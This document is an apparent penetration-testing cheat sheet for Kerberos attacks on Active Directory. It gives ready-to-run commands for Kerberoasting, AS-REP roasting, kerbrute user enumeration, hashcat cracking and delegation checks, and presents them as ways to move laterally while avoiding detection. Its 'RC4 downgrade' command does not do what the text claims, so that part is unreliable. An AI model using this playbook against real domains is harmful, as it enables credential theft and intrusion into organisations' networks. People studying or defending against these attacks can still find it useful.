# Kerberoasting and AS-REP roasting

Kerberos ticket attacks are among the most reliable lateral movement techniques in
Active Directory environments. They require only a domain user account and produce
crackable material offline, away from detection.

## Kerberoasting

Any domain user can request a Kerberos service ticket (TGS) for any service account
with a registered SPN. The TGS is encrypted with the service account's password hash
(RC4 or AES depending on account configuration). RC4-encrypted tickets can be cracked
offline.

```text
# enumerate SPNs and request tickets
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# output to file for cracking
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# from a Windows shell (use with caution on noisy networks)
setspn -T domain.local -Q */*
```

The output is a list of TGS hashes in hashcat format 13100.

```text
# crack with hashcat
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# brute force short passwords (service accounts often have simple passwords)
hashcat -m 13100 tgs.txt -a 3 ?a?a?a?a?a?a?a?a
```

High-value targets: service accounts running IIS application pools, SQL Server
(`MSSQLSvc/...`), backup agents, and custom service accounts with domain admin
membership. Filter the SPN list for these before requesting tickets.

## Forcing RC4 downgrade

AES-encrypted Kerberos tickets (etype 17/18) are significantly harder to crack than
RC4 (etype 23). Request RC4 explicitly:

```text
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile tgs.txt \
  -no-preauth user
```

Some DCs accept RC4 ticket requests even when the account supports AES. If not,
focus cracking effort on the RC4 accounts (those with msDS-SupportedEncryptionTypes
not set, or set to include RC4).

## AS-REP roasting

Accounts with Kerberos pre-authentication disabled do not require a password to obtain
an AS-REP. The AS-REP response includes material encrypted with the account's password
hash (etype 23) which can be cracked offline.

```text
# enumerate accounts with pre-auth disabled
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip DC_IP

# or enumerate from an authenticated context
GetNPUsers.py domain.local/user:password -dc-ip DC_IP -request
```

The output is in hashcat format 18200:

```text
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Pre-authentication disabled is an explicit Active Directory setting. It is rare on
modern domains but occasionally present on legacy accounts or as a misconfiguration.
Check every account in a user list if the domain has many accounts.

## Targeted user enumeration

If no valid credentials are available yet, Kerberos user enumeration works against
most DCs by sending AS-REQ without pre-authentication and observing the error code:

```text
kerbrute userenum -d domain.local --dc DC_IP users.txt
```

Error code KDC_ERR_PREAUTH_REQUIRED means the account exists and has pre-auth enabled.
Error code KDC_ERR_CLIENT_REVOKED means the account is disabled. KDC_ERR_C_PRINCIPAL_UNKNOWN
means no such user. This allows building a valid user list without authentication.

## Post-crack

A cracked service account password provides:

- Local admin on any host where the service runs
- Access to the service's data (SQL databases, backup stores, IIS applications)
- Potential for delegation abuse if the account has constrained or unconstrained
  delegation configured

Check the cracked account for these with:

```text
# check for delegation
Get-ADUser -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation | \
  Where-Object { $_.TrustedForDelegation -eq $true -or $_.TrustedToAuthForDelegation -eq $true }

# from Linux
ldapsearch -H ldap://DC_IP -x -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" \
  "(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  sAMAccountName userAccountControl
```
